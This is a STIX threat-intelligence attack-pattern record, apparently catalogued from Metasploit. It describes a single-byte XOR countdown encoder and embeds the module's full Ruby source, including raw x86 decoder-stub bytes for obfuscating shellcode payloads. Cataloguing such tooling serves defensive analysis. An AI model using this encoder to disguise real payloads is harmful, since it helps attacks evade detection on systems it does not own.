{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3140e2f0-8786-4768-9df5-325f06792fe7",
    "created": "2024-08-14T16:33:19.218746Z",
    "modified": "2024-08-14T16:33:19.218749Z",
    "name": "Single-byte XOR Countdown Encoder",
    "description": " This encoder uses the length of the payload as a position-dependent encoder key to produce a small decoder stub. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/encoders/x86/countdown.rb",
            "external_id": "countdown.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Encoder::Xor\n\n  def initialize\n    super(\n      'Name'             => 'Single-byte XOR Countdown Encoder',\n      'Description'      => %q{\n        This encoder uses the length of the payload as a position-dependent\n        encoder key to produce a small decoder stub.\n      },\n      'Author'           => 'vlad902',\n      'Arch'             => ARCH_X86,\n      'License'          => MSF_LICENSE,\n      'Decoder'          =>\n        {\n          'BlockSize' => 1,\n        })\n  end\n\n  #\n  # Returns the decoder stub that is adjusted for the size of the buffer\n  # being encoded.\n  #\n  def decoder_stub(state)\n\n    # Sanity check that saved_registers doesn't overlap with modified_registers\n    if (modified_registers & saved_registers).length > 0\n      raise BadGenerateError\n    end\n    begin\n      decoder =\n        Rex::Arch::X86.set(\n          Rex::Arch::X86::ECX,\n          state.buf.length - 1,\n          state.badchars) +\n        \"\\xe8\\xff\\xff\\xff\" +  # call $+4\n        \"\\xff\\xc1\" +          # inc ecx\n        \"\\x5e\" +              # pop esi\n        \"\\x30\\x4c\\x0e\\x07\" +  # xor_loop: xor [esi + ecx + 0x07], cl\n        \"\\xe2\\xfa\"            # loop xor_loop\n\n      # Initialize the state context to 1\n      state.context = 1\n    rescue RuntimeError => e\n      raise BadcharError if e.message == \"No valid set instruction could be created!\"\n    end\n    return decoder\n  end\n\n  #\n  # Encodes a one byte block with the current index of the length of the\n  # payload.\n  #\n  def encode_block(state, block)\n    state.context += 1\n\n    [ block.unpack('C')[0] ^ (state.context - 1) ].pack('C')\n  end\n\n  # Indicate that this module can preserve some registers\n  def can_preserve_registers?\n    true\n  end\n\n  # A list of registers always touched by this encoder\n  def modified_registers\n    [ Rex::Arch::X86::ECX, Rex::Arch::X86::ESI ]\n  end\n\n  # Convert the SaveRegisters to an array of x86 register constants\n  def saved_registers\n    Rex::Arch::X86.register_names_to_ids(datastore['SaveRegisters'])\n  end\nend\n"
}